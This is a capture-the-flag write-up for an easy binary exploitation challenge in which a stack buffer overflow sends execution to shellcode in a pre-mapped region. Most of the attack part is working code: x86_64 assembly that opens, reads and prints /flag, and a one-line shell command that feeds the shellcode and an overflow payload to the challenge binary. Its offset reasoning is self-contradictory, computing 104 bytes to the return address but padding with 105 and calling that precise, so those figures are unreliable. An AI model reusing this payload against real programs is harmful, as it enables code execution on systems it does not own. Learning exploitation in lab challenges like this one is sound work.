# **Binary Exploitation: Hijack to Mapped Shellcode (Easy) - Complete Writeup**

## **Challenge Overview**
This challenge requires hijacking program control flow to execute shellcode loaded in a separate memory-mapped region. The program provides:
- A vulnerable buffer (80 bytes)
- A pre-mapped executable region for shellcode
- Disabled stack protections (no canary, executable stack)
- Detailed stack layout information

## **Key Components**

### **1. Memory Layout**
```
Input buffer:    0x7ffd22cfc720 (80 bytes)
Return address:  0x7ffd22cfc788 (offset +0x68 from buffer start)
Shellcode region: 0x1f234000 (provided by challenge)
```

### **2. Vulnerability**
- Buffer overflow possible (can write beyond 80 bytes)
- No stack canary to detect overflows
- Return address can be overwritten

## **Solution Strategy**

### **1. Shellcode Preparation**
We use standard flag-reading shellcode:
```asm
section .text
global _start

_start:
    ; Open /flag
    xor rax, rax
    push rax
    mov rbx, 0x67616c662f2f2f2f  ; '////flag' in reverse
    push rbx
    mov rdi, rsp
    mov al, 2          ; sys_open
    xor rsi, rsi       ; O_RDONLY
    xor rdx, rdx       ; mode
    syscall

    ; Read file
    mov rdi, rax       ; fd
    mov rsi, rsp       ; buffer
    mov dl, 0x40       ; read 64 bytes
    xor eax, eax       ; sys_read
    syscall

    ; Write to stdout
    xor edi, edi
    inc edi            ; stdout = 1
    xor eax, eax
    inc eax            ; sys_write = 1
    syscall

    ; Exit
    xor eax, eax
    mov al, 60         ; sys_exit
    xor edi, edi       ; exit code 0
    syscall
```

### **2. Exploit Construction**

#### **Critical Offset Calculation**
```
Return address offset = 0x7ffd22cfc788 - 0x7ffd22cfc720 = 0x68 (104 decimal)
```
However, we need **105 bytes** of padding because:
- Bytes 0-103 fill the buffer (104 bytes)
- Byte 104 starts overwriting the return address

#### **Payload Structure**
1. **First Input (Shellcode)**:
   - Sent to mapped region at 0x1f234000
   - Contains our flag-reading code

2. **Second Input (Overflow)**:
   ```
   [105 bytes padding] + [8-byte shellcode address]
   ```

### **3. Final Exploit Command**
```bash
(cat shellcode.bin; python3 -c 'import sys; sys.stdout.buffer.write(b"A"*105 + b"\x00\x40\x23\x1f\x00\x00\x00\x00")') | /challenge/binary-exploitation-hijack-to-mmap-shellcode-w
```

## **Step-by-Step Execution**

1. **Program Initialization**:
   - Maps shellcode region at 0x1f234000
   - Shows stack layout with buffer at 0x7ffd22cfc720

2. **Shellcode Loading**:
   - First input (shellcode.bin) is written to 0x1f234000
   - Challenge verifies the loaded shellcode

3. **Buffer Overflow**:
   - 105 bytes of padding ('A's) fill the buffer and start overwriting return address
   - Next 8 bytes set return address to 0x1f234000

4. **Control Flow Hijack**:
   - Function returns to our shellcode
   - Shellcode executes, reading and printing the flag

## **Why This Works**

1. **Precise Overflow Calculation**:
   - 105 bytes reaches exactly the start of return address
   - 8-byte address overwrite redirects execution cleanly

2. **Memory Permissions**:
   - Shellcode region is executable
   - Stack protections are disabled

3. **Shellcode Reliability**:
   - Uses position-independent techniques
   - Avoids null bytes
   - Handles file operations correctly

## **Key Lessons Learned**

1. **Offset Calculation**:
   - Always verify exact memory distances
   - Account for zero-based vs one-based counting

2. **Input Sequencing**:
   - Challenge expects shellcode first, then overflow
   - Order matters in multi-stage inputs

3. **Architecture Details**:
   - Little-endian address formatting
   - x86_64 calling conventions

## **Debugging Tips**

If the exploit fails:
1. Check the stack dump to verify:
   - Padding reaches return address
   - Address is overwritten correctly
2. Verify shellcode is properly loaded:
   - Compare with challenge's disassembly output
3. Test with debugger:
   - Set breakpoints at return instructions
   - Examine register states

## **Conclusion**
This challenge demonstrates fundamental control flow hijacking:
1. Leveraging buffer overflows
2. Redirecting execution to injected code
3. Using provided memory regions effectively

The solution combines precise memory calculation with reliable shellcode construction, providing a foundation for more advanced exploitation techniques.
